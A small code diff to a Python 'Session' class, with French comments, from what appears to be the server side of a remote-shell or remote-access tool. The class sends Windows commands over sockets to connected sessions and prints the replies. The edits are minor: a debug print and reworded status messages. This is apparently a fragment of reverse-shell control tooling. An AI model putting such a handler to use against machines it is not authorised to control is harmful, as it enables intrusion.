@@ -38,7 +38,6 @@ class Session:
         #Ouvre un shell sur la machine distante.
         #Envoie une message au client pour lui dire de se mettre en mode shell.
         #result_command = ""
-       
         printColor("help","\n\n[?] Execute -b or --back to return to sessions mode.") 
         printColor("help","\r[?] Mod shell active, You can run windows commands.\n\n")
         while Handler.dict_conn[self.session_nb][NB_ALIVE]:
@@ -49,6 +48,7 @@ class Session:
                     break
                 else:
                     # self.socket.send(shell.encode())
+                    print(self.session_nb)
                     if(CheckConn().safeSend(self.session_nb, self.socket,shell.encode())):
                         print(recvall(self.socket,4096).decode("latin1"))
                     else:
@@ -80,8 +80,8 @@ class Session:
                 else:
                     pass
             
-        printColor("information","\n[-] The session was cut, back to menu.") #If the session close.
-        printColor("information","\r[-] Back to the server menu.\n")
+        printColor("information","[-] The session was cut, back to menu.") #If the session close.
+        printColor("information","[-] Back to the server menu.\n")
 
         #for key in Handler.dict_conn.keys():
             #print("Session ",key," ",Handler.dict_conn[key][1]+":"+str(Handler.dict_conn[key][2]))
